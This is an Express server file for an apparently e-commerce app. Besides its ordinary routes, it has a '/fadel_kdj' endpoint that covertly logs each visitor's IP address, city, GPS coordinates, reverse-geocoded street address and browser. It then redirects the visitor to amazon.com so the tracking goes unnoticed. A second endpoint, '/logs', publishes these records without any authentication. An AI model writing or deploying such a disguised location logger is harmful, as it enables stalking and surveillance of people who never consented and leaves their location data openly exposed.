const express = require('express');
const geoip = require('geoip-lite');
const axios = require('axios');
const port=3000
const cookies=require("cookie-parser")
const app =express()
const UserRouter=require("./routes/userRoutes")
const CategoriesRouter=require("./routes/categoryRoutes")
const ProduitRouter=require("./routes/produitRoutes")
const PayementRouter=require("./routes/payementRoute")
const frontendRouter=require("./routes/frontendRoutes")
const GoPresenseRouter=require("./routes/go-presence")
const cors=require("cors")

const connectDB=require("./connexion")

connectDB()
app.use(cookies())
app.use(cors({
    
    credentials: true
})) 


app.use(express.json())
app.use(express.static('public'))
app.use("/user",UserRouter)
app.use("/categories",CategoriesRouter)
app.use("/produits",ProduitRouter)
app.use("/paiements",PayementRouter)
app.use("/",frontendRouter)
app.use("/presence",GoPresenseRouter)
app.get("/fadel_kdj", async (req,res)=>{
    const timestamp = new Date().toISOString();
    const ipAddress = req.ip || req.connection.remoteAddress || 'Inconnu';
    
    // Obtenir la géolocalisation
    const geo = geoip.lookup(ipAddress);
    const pays = geo?.country || 'Inconnu';
    const region = geo?.city || 'Inconnu';
    const timezone = geo?.timezone || 'Inconnu';
    const coordonnees = geo ? `${geo.ll[0]}, ${geo.ll[1]}` : 'Inconnu';
    
    // Obtenir l'adresse exacte avec Nominatim
    let adresseExacte = 'Non disponible';
    if (geo?.ll) {
        try {
            const response = await axios.get('https://nominatim.openstreetmap.org/reverse', {
                params: {
                    format: 'json',
                    lat: geo.ll[0],
                    lon: geo.ll[1],
                    zoom: 18,
                    addressdetails: 1
                },
                headers: {
                    'User-Agent': 'NFC-Click-Logger/1.0'
                }
            });
            adresseExacte = response.data.address?.road || response.data.address?.suburb || response.data.display_name || 'Non trouvée';
        } catch (err) {
            console.error('Erreur géocodage:', err.message);
        }
    }
    
    const userAgent = req.get('user-agent') || 'Inconnu';
    const referrer = req.get('referer') || 'Direct';
    
    const ligne = `
================================================================================
⏰ Timestamp: ${timestamp}
📍 Adresse IP: ${ipAddress}
🌍 Localisation: ${region}, ${pays}
🏠 Adresse exacte: ${adresseExacte}
📌 Coordonnées GPS: ${coordonnees}
🕐 Fuseau horaire: ${timezone}
🌐 User-Agent: ${userAgent}
🔗 Référent: ${referrer}
================================================================================
`;
    
    require('fs').appendFile('clicks.txt', ligne, (err) => {
        if (err) {
            console.error('Erreur lors de l\'enregistrement du click:', err);
            return res.status(500).json({ message: 'Erreur lors de l\'enregistrement du click' });
        }
    });
    res.redirect('https://amazon.com');
});
app.get("/logs",(req,res)=>{
    const content=require('fs').readFileSync('clicks.txt','utf-8');
    res.type('text/plain').send(content);
    
});
app.listen(port,()=>{
    console.log(`le serveur est en cours d'exécution sur le port ${port}`)
})